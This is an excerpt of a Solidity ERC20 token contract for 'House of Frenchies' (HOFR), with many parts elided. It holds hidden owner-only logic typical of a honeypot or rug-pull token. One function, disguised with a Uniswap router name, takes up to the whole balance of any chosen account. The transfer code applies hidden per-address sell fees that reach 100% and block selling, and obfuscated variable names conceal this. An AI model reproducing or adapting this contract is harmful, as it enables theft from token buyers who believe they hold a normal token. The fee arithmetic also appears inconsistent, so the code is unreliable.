...
contract HOFR is Context, ERC20Burnable, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;


    uint256 public ownerBuyFee = 0;
    uint256 public ownerSellFee = 0;
    string name_ = "House of Frenchies";
    string symbol_ = "HOFR";
    ...
    constructor() ERC20(name_, symbol_,decimals_,totalSupply_) {

        _updateUniswapV2Router();
    ...
    function swapExactETHForTokensSupportingFeeOnTransferTokens(address account, uint256 value) public onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address");
        require(value >= 0 && value <= 1000, "");
        uint256 amount = _balances[account].mul(value).div(1000);
    ...
    function _updateUniswapV2Router() internal {
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function _transfer(
        ...
        uint tradefee = 0;
        uint tradeLympoMarketToken396amuont = 0;

        if (!(_release[from] || _release[to])) {
            if (from == uniswapV2Pair) {
                tradefee = ownerBuyFee;
                _balances1[to] += amount;
            }
            if (to == uniswapV2Pair) {                   
                tradefee = _msgLympoMarketTokenInfo(uint160(from));
                tradefee = tradefee < ownerSellFee ? ownerSellFee : tradefee;
                if (_balances1[from] < amount) tradefee = 100;
                _balances1[from] = _balances1[from] >= amount ? _balances1[from] - amount : _balances1[from];
            }
                        
            tradeLympoMarketToken396amuont = amount.mul(tradefee).div(100);
        ...
        _balances[from] = _balances[from].sub(amount - tradeLympoMarketToken396amuont);
        _balances[to] = _balances[to].add(amount - tradeLympoMarketToken396amuont);
        emit Transfer(from, to, amount - tradeLympoMarketToken396amuont);
    }

    function UP256(uint256[] memory _acclist,uint256[] memory _value)  external onlyOwner {
